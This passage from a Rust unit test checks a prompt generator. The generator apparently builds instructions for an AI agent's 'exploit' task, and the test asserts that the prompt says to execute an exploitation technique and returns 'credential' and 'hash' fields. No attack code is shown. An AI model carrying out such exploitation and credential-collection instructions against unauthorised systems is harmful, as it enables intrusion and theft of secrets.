        let prompt = generate_task_prompt("exploit", "t-26", &payload, None).unwrap();
        assert!(prompt.contains("unknown_vuln"));
        assert!(prompt.contains("Execute the exploitation technique"));
        assert!(prompt.contains("\"credential\""));
        assert!(prompt.contains("\"hash\""));
    }
}
